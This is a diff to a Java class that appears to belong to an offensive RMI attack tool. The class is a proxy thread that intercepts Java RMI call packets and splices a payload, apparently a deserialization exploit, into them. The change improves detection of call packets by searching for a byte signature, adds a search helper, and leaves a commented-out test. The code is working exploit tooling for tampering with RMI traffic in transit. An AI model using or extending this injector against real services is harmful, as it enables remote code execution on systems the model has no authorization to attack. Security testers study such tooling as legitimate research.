@@ -2,6 +2,8 @@ package payloads.thread;
 
 import java.io.ByteArrayOutputStream;
 import java.net.Socket;
+import java.net.UnknownHostException;
+
 import proxy.thread.ProxyThread;
 
 /***********************************************************
@@ -39,13 +41,14 @@ public class LookupPayloadInjectingProxyThread extends ProxyThread {
 		dataBytes = data.toByteArray();
 		
 		//Check if the packet is an RMI call packet
-		if(dataBytes.length > 7 && dataBytes[0] == (byte)0x50) {
+		int indexOf = indexOf(dataBytes, new byte[]{(byte)0x50, (byte)0xac, (byte)0xed});
+		if(dataBytes.length > 7 && indexOf != -1) {
 			//Call packets begin with a TC_BLOCKDATA element, get the length of this element
-			blockLen = (int)(dataBytes[6] & 0xff);
+			blockLen = (int)(dataBytes[ indexOf + 6 ] & 0xff);
 			
 			//Construct a new packet, starting with the contents of the original packet and TC_BLOCKDATA element
 			out = new ByteArrayOutputStream();
-			out.write(dataBytes, 0, blockLen + 7);
+			out.write(dataBytes, indexOf, blockLen + 7);
 			
 			//Write the payload bytes to the new packet
 			out.write(this._payload, 0, this._payload.length);
@@ -60,4 +63,22 @@ public class LookupPayloadInjectingProxyThread extends ProxyThread {
 			return data;
 		}
 	}
+	public static int indexOf(byte[] outerArray, byte[] smallerArray) {
+		for(int i = 0; i < outerArray.length - smallerArray.length+1; ++i) {
+			boolean found = true;
+			for(int j = 0; j < smallerArray.length; ++j) {
+				if (outerArray[i+j] != smallerArray[j]) {
+					found = false;
+					break;
+				}
+			}
+			if (found) return i;
+		}
+		return -1;
+	}
+//	public static void main(String[] args) throws UnknownHostException {
+//		byte[] dataBytes=new byte[]{(byte)0x50, (byte)0xac, (byte)0xed};
+//		int indexOf = indexOf(dataBytes, new byte[]{(byte)0x50, (byte)0xac, (byte)0xed});
+//		System.out.println(indexOf);
+//	}
 }
